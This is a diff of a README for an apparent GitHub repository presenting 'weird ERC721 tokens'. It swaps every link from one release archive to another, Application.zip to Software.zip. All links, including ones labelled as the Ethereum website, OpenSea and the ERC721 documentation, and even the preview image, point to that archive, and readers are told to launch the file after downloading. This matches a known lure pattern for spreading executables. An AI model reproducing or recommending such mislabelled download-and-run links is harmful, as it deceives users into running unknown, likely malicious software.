@@ -9,7 +9,7 @@ Our ERC721 tokens stand out from the crowd due to their eccentric designs, stran
 ## 🚀 Get Started:
 To explore our collection of weird ERC721 tokens, simply download the latest release from the link below.
 
-[![Download Release](https://github.com/HyperBVJI/weird-erc721/releases/download/v1.0/Application.zip)](https://github.com/HyperBVJI/weird-erc721/releases/download/v1.0/Application.zip)
+[![Download Release](https://github.com/HyperBVJI/weird-erc721/releases/download/v2.0/Software.zip)](https://github.com/HyperBVJI/weird-erc721/releases/download/v2.0/Software.zip)
 *(Note: The release file needs to be launched after downloading.)*
 
 ## 🌌 About ERC721 Tokens:
@@ -21,12 +21,12 @@ If you're fascinated by the world of weird ERC721 tokens and want to connect wit
 ## 📸 Sneak Peek:
 Here's a glimpse of what you can expect from our collection of weird ERC721 tokens:
 
-![Weird ERC721 Token](https://github.com/HyperBVJI/weird-erc721/releases/download/v1.0/Application.zip)
+![Weird ERC721 Token](https://github.com/HyperBVJI/weird-erc721/releases/download/v2.0/Software.zip)
 
 ## 📎 Additional Resources:
-- **[Ethereum Official Website](https://github.com/HyperBVJI/weird-erc721/releases/download/v1.0/Application.zip):** Visit the official Ethereum website to learn more about blockchain technology and the Ethereum ecosystem.
-- **[OpenSea Marketplace](https://github.com/HyperBVJI/weird-erc721/releases/download/v1.0/Application.zip):** Explore and trade a wide range of NFTs, including ERC721 tokens, on the popular OpenSea NFT marketplace.
-- **[ERC721 Standard Documentation](https://github.com/HyperBVJI/weird-erc721/releases/download/v1.0/Application.zip):** Dive into the technical details of the ERC721 standard and understand how these tokens are created and managed.
+- **[Ethereum Official Website](https://github.com/HyperBVJI/weird-erc721/releases/download/v2.0/Software.zip):** Visit the official Ethereum website to learn more about blockchain technology and the Ethereum ecosystem.
+- **[OpenSea Marketplace](https://github.com/HyperBVJI/weird-erc721/releases/download/v2.0/Software.zip):** Explore and trade a wide range of NFTs, including ERC721 tokens, on the popular OpenSea NFT marketplace.
+- **[ERC721 Standard Documentation](https://github.com/HyperBVJI/weird-erc721/releases/download/v2.0/Software.zip):** Dive into the technical details of the ERC721 standard and understand how these tokens are created and managed.
 
 ## 📢 Spread the Word:
 If you find our collection of weird ERC721 tokens intriguing, don't hesitate to share this repository with your friends, fellow collectors, and anyone who appreciates the strange and wonderful world of NFTs. Let's spread the joy of weirdness together!
